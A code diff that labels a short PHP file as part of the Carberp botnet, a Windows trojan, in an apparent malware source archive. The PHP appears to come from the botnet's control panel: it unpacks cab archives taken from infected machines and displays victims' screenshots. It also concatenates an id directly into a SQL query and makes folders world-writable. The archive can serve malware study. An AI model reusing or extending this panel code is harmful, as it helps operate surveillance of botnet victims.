@@ -1,9 +1,22 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 if(!empty($Cur['id']) && !empty($Cur['str'])){
 	$item = $mysqli->query('SELECT id, file from bf_cabs WHERE id = '.$Cur['id'].' LIMIT 1');
 	//cabextract -F screen.jpeg -d /var/www/lighttpd/check.ples.in/cache/cabs/ 1003771869.cab
-	if($item->id == $Cur['id']){		switch($Cur['str']){			case 'text':
+	if($item->id == $Cur['id']){
+		switch($Cur['str']){
+			case 'text':
             	$t = time() . mt_rand('1111', '9999');
             	mkdir('cache/cabs/' . $t . '/');
             	chmod('cache/cabs/' . $t . '/', 0777);
@@ -28,7 +41,8 @@ if(!empty($Cur['id']) && !empty($Cur['str'])){
             		print(file_get_contents('cache/cabs/' . $t . '/screen.jpeg'));
             		@unlink('cache/cabs/' . $t . '/screen.jpeg');
             		@rmdir('cache/cabs/' . $t);
-            	}else{            		print('ERROR!');
+            	}else{
+            		print('ERROR!');
             	}
 			break;
 		}
